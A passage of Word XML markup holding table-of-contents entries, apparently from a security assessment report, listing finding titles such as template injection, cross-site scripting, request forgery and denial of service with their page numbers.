              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039276 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3080F97D" w14:textId="573C77E6" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039277" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.33.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Unreleased Resource: Streams</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039277 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5EF009F3" w14:textId="0B82E14B" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039278" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1.34.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Weak Cryptographic Hash</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039278 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="39BA8B71" w14:textId="22E94BA1" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="960"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039279" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.2</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Dynamic Code Analysis</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039279 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="44843190" w14:textId="6CDB4857" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039281" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.2.1.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Server Side Template Injection (SSTI)</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039281 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>18</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1E6E2E0B" w14:textId="79BB742F" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039282" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.2.2.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>No password for database was set</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039282 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="03E90F7A" w14:textId="7E333EB2" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="960"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039283" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Attacks</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039283 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1F0366A2" w14:textId="5D97271D" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039285" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.1.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Build Misconfiguration: External Maven Dependency Repository</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039285 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="608507E0" w14:textId="61515487" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039286" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.2.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Request Forgery</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039286 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6A8C10F6" w14:textId="64FD0FAF" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039287" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.3.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Scripting</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039287 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1A739F7C" w14:textId="1F875C14" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039288" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.4.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Scripting: DOM</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039288 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="60BA2406" w14:textId="1BDE222B" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039289" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.5.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Scripting: Self</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039289 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6004DB0F" w14:textId="673A6BEC" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039290" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.6.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Dead Code: Expression is Always true</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039290 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3554C955" w14:textId="3E71955E" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039291" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.7.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Denial of Service</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039291 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
